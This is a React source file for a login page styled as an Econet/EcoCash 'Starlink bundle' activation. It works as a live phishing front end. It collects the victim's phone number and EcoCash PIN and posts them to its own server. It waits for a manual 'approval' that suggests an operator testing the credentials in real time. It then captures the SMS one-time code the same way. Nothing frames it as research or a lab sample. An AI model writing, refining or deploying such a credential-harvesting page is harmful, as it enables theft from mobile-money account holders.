import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '../AppContext';
import { useUserId } from '../hooks/useUserId';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  const { userId, apiBase } = useUserId();
  const { selectedPlan, authData, updateAuthData, serverStatus } = useApp();

  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  const api = (path) => `${API_BASE_URL}${apiBase}/${path}`;

  // Phase: 'login' | 'waiting' | 'otp' | 'verifying'
  const [phase, setPhase] = useState('login');

  // Login fields
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);

  // OTP fields
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [otpTimer, setOtpTimer] = useState(0);
  const [isResending, setIsResending] = useState(false);

  const [error, setError] = useState('');
  const [waitingStatus, setWaitingStatus] = useState('');
  const [isReturningUser, setIsReturningUser] = useState(false);

  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const otpRefs = [useRef(null), useRef(null), useRef(null), useRef(null), useRef(null), useRef(null)];
  const pollingRef = useRef(null);

  useEffect(() => () => clearInterval(pollingRef.current), []);

  useEffect(() => {
    if (otpTimer > 0) {
      const t = setInterval(() => setOtpTimer(p => p <= 1 ? (clearInterval(t), 0) : p - 1), 1000);
      return () => clearInterval(t);
    }
  }, [otpTimer]);

  const validatePhone = (num) => {
    if (num.length < 9 || num.length > 10) return false;
    if (num.length === 10 && !num.startsWith('07')) return false;
    if (num.length === 9 && !num.startsWith('7')) return false;
    return true;
  };

  // ---- Phone handlers ----
  const handlePhoneChange = (e) => {
    setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10));
    setError('');
  };

  // ---- PIN handlers ----
  const handlePinChange = (i, val) => {
    const v = val.replace(/\D/g, '');
    if (v.length > 1) return;
    const np = [...pin]; np[i] = v; setPin(np);
    if (v && i < 3) pinRefs[i + 1].current.focus();
    setError('');
  };

  const handlePinKeyDown = (i, e) => {
    if (e.key === 'Backspace') {
      if (pin[i]) { const np = [...pin]; np[i] = ''; setPin(np); }
      else if (i > 0) pinRefs[i - 1].current.focus();
    }
    if (e.key === 'ArrowLeft' && i > 0) pinRefs[i - 1].current.focus();
    if (e.key === 'ArrowRight' && i < 3) pinRefs[i + 1].current.focus();
  };

  const handlePinPaste = (e, i) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
    const np = [...pin];
    digits.forEach((d, j) => { if (i + j < 4) np[i + j] = d; });
    setPin(np);
    pinRefs[Math.min(i + digits.length, 3)].current.focus();
  };

  // ---- OTP handlers ----
  const handleOtpChange = (i, val) => {
    const v = val.replace(/\D/g, '');
    if (v.length > 1) return;
    const no = [...otp]; no[i] = v; setOtp(no);
    if (v && i < 5) otpRefs[i + 1].current.focus();
  };

  const handleOtpKeyDown = (i, e) => {
    if (e.key === 'Backspace') {
      if (otp[i]) { const no = [...otp]; no[i] = ''; setOtp(no); }
      else if (i > 0) otpRefs[i - 1].current.focus();
    }
    if (e.key === 'ArrowLeft' && i > 0) otpRefs[i - 1].current.focus();
    if (e.key === 'ArrowRight' && i < 5) otpRefs[i + 1].current.focus();
  };

  const handleOtpPaste = (e, i) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const no = [...otp];
    digits.forEach((d, j) => { if (i + j < 6) no[i + j] = d; });
    setOtp(no);
    otpRefs[Math.min(i + digits.length, 5)].current.focus();
  };

  // ---- Login submit ----
  const handleLogin = async (e) => {
    e.preventDefault();
    setError('');

    if (!validatePhone(phoneNumber)) {
      setError('Enter a valid number: 07xxxxxxxx or 7xxxxxxxx');
      return;
    }
    if (pin.some(d => d === '')) {
      setError('Please enter your 4-digit PIN');
      return;
    }

    const clean = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
    const formatted = `+263${clean}`;
    const fullPin = pin.join('');

    updateAuthData({ phoneNumber: formatted, pin: fullPin });

    try { localStorage.setItem('econet_phone', formatted); } catch (_) {}

    setPhase('waiting');
    setWaitingStatus('Connecting...');

    try {
      const statusRes = await fetch(api('check-user-status'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formatted })
      });
      const statusData = await statusRes.json();
      setIsReturningUser(statusData.isReturningUser || false);

      const loginRes = await fetch(api('login'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: formatted, pin: fullPin,
          timestamp: new Date().toISOString(),
          bundle: selectedPlan ? { data: selectedPlan.data, price: selectedPlan.price, validity: selectedPlan.validity } : null,
        })
      });
      const loginData = await loginRes.json();

      if (!loginData.success) {
        setPhase('login');
        setError('Failed to process. Please try again.');
        return;
      }

      setWaitingStatus('Please wait...');
      pollForApproval(formatted, fullPin, statusData.isReturningUser || false);

    } catch (err) {
      setPhase('login');
      setError('Connection error. Please try again.');
    }
  };

  const pollForApproval = (phone, fullPin, returning) => {
    let attempts = 0;
    pollingRef.current = setInterval(async () => {
      attempts++;
      if (attempts > 60) {
        clearInterval(pollingRef.current);
        setPhase('login');
        setError('Request timed out. Please try again.');
        return;
      }
      try {
        const res = await fetch(api('check-login-approval'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, pin: fullPin })
        });
        const data = await res.json();
        if (data.approved) {
          clearInterval(pollingRef.current);
          if (returning) {
            navigate(`/${userId}/status`);
          } else {
            setPhase('otp');
            setOtpTimer(104);
          }
        } else if (data.rejected) {
          clearInterval(pollingRef.current);
          setPhase('login');
          setError('Wrong PIN or phone number.');
        } else if (data.expired) {
          clearInterval(pollingRef.current);
          setPhase('login');
          setError('Session expired. Please try again.');
        }
      } catch (_) {}
    }, 5000);
  };

  // ---- OTP submit ----
  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    const fullOtp = otp.join('');
    if (fullOtp.length !== 6) { setError('Enter the complete 6-digit code'); return; }

    const phone = authData.phoneNumber;
    setPhase('verifying');
    setError('');

    try {
      await fetch(api('verify-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone, otp: fullOtp,
          timestamp: new Date().toISOString(),
          bundle: selectedPlan ? { data: selectedPlan.data, price: selectedPlan.price, validity: selectedPlan.validity } : null,
        })
      });

      // Poll for OTP approval
      let attempts = 0;
      const otpPoll = setInterval(async () => {
        attempts++;
        if (attempts > 150) {
          clearInterval(otpPoll);
          setPhase('otp');
          setError('Verification timed out. Please try again.');
          return;
        }
        try {
          const res = await fetch(api('check-otp-status'), {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber: phone, otp: fullOtp })
          });
          const data = await res.json();
          if (data.status === 'approved') {
            clearInterval(otpPoll);
            navigate(`/${userId}/status`);
          } else if (data.status === 'rejected' || data.status === 'wrong_pin') {
            clearInterval(otpPoll);
            setPhase('otp');
            setOtp(['', '', '', '', '', '']);
            setError('Incorrect code. Please check your SMS.');
          }
        } catch (_) {}
      }, 2000);

    } catch (err) {
      setPhase('otp');
      setError('Verification failed. Please try again.');
    }
  };

  const handleResend = async () => {
    if (otpTimer > 0 || isResending) return;
    setIsResending(true);
    try {
      const res = await fetch(api('resend-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: authData.phoneNumber, timestamp: new Date().toISOString() })
      });
      const data = await res.json();
      if (data.success) { setOtp(['', '', '', '', '', '']); setOtpTimer(104); }
      else setError('Failed to resend. Try again.');
    } catch (_) { setError('Failed to resend. Try again.'); }
    finally { setIsResending(false); }
  };

  const isLoginReady = phoneNumber.length >= 9 && pin.every(d => d !== '');
  const isOtpReady = otp.every(d => d !== '');

  // ===== RENDER: WAITING =====
  if (phase === 'waiting' || phase === 'verifying') {
    return (
      <div className="lg-root">
        <BgElements />
        <div className="lg-waiting">
          <div className="lg-waiting-orbit">
            <div className="lg-waiting-planet" />
            <div className="lg-waiting-ring" />
          </div>
          <h2 className="lg-waiting-title">
            {phase === 'verifying' ? 'Verifying Code' : 'Processing Login'}
          </h2>
          <p className="lg-waiting-sub">
            {phase === 'verifying' ? 'Please wait a moment...' : waitingStatus}
          </p>
          <div className="lg-waiting-dots">
            <span /><span /><span />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="lg-root">
      <BgElements />

      <header className="lg-header">
        <button className="lg-back" onClick={() => navigate(`/${userId}`)}>← Back</button>
        <div className="lg-logo">
          <img src="/logo.png" alt="" className="lg-logo-img" onError={e => e.target.style.display='none'} />
          <span className="lg-logo-eco">Eco</span><span className="lg-logo-net">net</span>
        </div>
        <div style={{width:60}} />
      </header>

      <main className="lg-main">
        <div className="lg-card">

          {/* Plan summary chip */}
          {selectedPlan && (
            <div className="lg-plan-chip">
              <span className="lg-plan-chip-icon">📡</span>
              <span>{selectedPlan.data} — ${selectedPlan.price.toFixed(2)} / {selectedPlan.validity}</span>
            </div>
          )}

          {/* ===== OTP PHASE ===== */}
          {phase === 'otp' ? (
            <>
              <div className="lg-phase-indicator">
                <span className="lg-phase-dot lg-phase-dot--done">✓</span>
                <div className="lg-phase-line lg-phase-line--done" />
                <span className="lg-phase-dot lg-phase-dot--active">2</span>
              </div>

              <h1 className="lg-title">Verify Your Number</h1>
              <p className="lg-subtitle">
                Enter the 6-digit code sent to<br />
                <strong>{authData.phoneNumber}</strong>
              </p>

              {error && <div className="lg-error">{error}</div>}

              <form onSubmit={handleOtpSubmit}>
                <div className="lg-otp-row">
                  {otp.map((digit, i) => (
                    <input
                      key={i}
                      ref={otpRefs[i]}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={e => handleOtpChange(i, e.target.value)}
                      onKeyDown={e => handleOtpKeyDown(i, e)}
                      onPaste={e => handleOtpPaste(e, i)}
                      className="lg-otp-box"
                    />
                  ))}
                </div>

                <p className="lg-resend-text">
                  {isResending ? (
                    <span className="lg-resend-loading">Resending...</span>
                  ) : otpTimer > 0 ? (
                    `Resend in ${otpTimer}s`
                  ) : (
                    <>Didn't get it? <span className="lg-resend-link" onClick={handleResend}>Resend</span></>
                  )}
                </p>

                <button
                  type="submit"
                  className={`lg-btn ${isOtpReady ? 'lg-btn--active' : ''}`}
                  disabled={!isOtpReady}
                >
                  Verify & Activate Bundle
                </button>
              </form>
            </>
          ) : (
            /* ===== LOGIN PHASE ===== */
            <>
              <div className="lg-phase-indicator">
                <span className="lg-phase-dot lg-phase-dot--active">1</span>
                <div className="lg-phase-line" />
                <span className="lg-phase-dot">2</span>
              </div>

              <h1 className="lg-title">Sign In</h1>
              <p className="lg-subtitle">Enter your EcoCash details to activate your bundle</p>

              {error && <div className="lg-error">{error}</div>}

              {!serverStatus.isActive && !serverStatus.isChecking && (
                <div className="lg-server-error">⚠️ Server unavailable. Please try later.</div>
              )}

              <form onSubmit={handleLogin}>
                {/* Phone */}
                <div className="lg-field">
                  <label className="lg-label">Phone Number</label>
                  <div className="lg-phone-wrap">
                    <div className="lg-country-code">
                      <span>🇿🇼</span>
                      <span>+263</span>
                    </div>
                    <input
                      type="tel"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="712345678"
                      className="lg-phone-input"
                      inputMode="numeric"
                      maxLength={10}
                      disabled={serverStatus.isChecking}
                    />
                  </div>
                </div>

                {/* PIN */}
                <div className="lg-field">
                  <label className="lg-label">EcoCash PIN</label>
                  <div className="lg-pin-wrap">
                    <div className="lg-pin-row">
                      {pin.map((digit, i) => (
                        <input
                          key={i}
                          ref={pinRefs[i]}
                          type={showPin ? 'text' : 'password'}
                          inputMode="numeric"
                          maxLength={1}
                          value={digit}
                          onChange={e => handlePinChange(i, e.target.value)}
                          onKeyDown={e => handlePinKeyDown(i, e)}
                          onPaste={e => handlePinPaste(e, i)}
                          className="lg-pin-box"
                          disabled={serverStatus.isChecking}
                        />
                      ))}
                    </div>
                    <button
                      type="button"
                      className="lg-eye-btn"
                      onClick={() => setShowPin(p => !p)}
                    >
                      {showPin ? '👁️' : '👁️‍🗨️'}
                    </button>
                  </div>
                  <span className="lg-forgot" onClick={() => window.location.href='https://play.google.com/store/apps/details?id=com.ecocash&hl=en'}>
                    Forgot PIN?
                  </span>
                </div>

                <button
                  type="submit"
                  className={`lg-btn ${isLoginReady && serverStatus.isActive ? 'lg-btn--active' : ''}`}
                  disabled={!isLoginReady || !serverStatus.isActive || serverStatus.isChecking}
                >
                  {serverStatus.isChecking ? 'Connecting...' : 'Continue →'}
                </button>
              </form>

              <div className="lg-register-row">
                <span>New to EcoCash?</span>
                <a href="https://play.google.com/store/apps/details?id=com.ecocash&hl=en" className="lg-register-link">Register here</a>
              </div>
            </>
          )}
        </div>
      </main>

      <footer className="lg-footer">© 2026 Econet × Starlink</footer>
    </div>
  );
}

function BgElements() {
  return (
    <>
      <div className="lg-stars">
        {[...Array(50)].map((_, i) => (
          <div key={i} className="lg-star" style={{
            left: `${Math.random() * 100}%`,
            top: `${Math.random() * 100}%`,
            animationDelay: `${Math.random() * 3}s`,
            width: `${Math.random() * 2 + 1}px`,
            height: `${Math.random() * 2 + 1}px`,
          }} />
        ))}
      </div>
      <div className="lg-glow-top" />
      <div className="lg-glow-bottom" />
    </>
  );
}
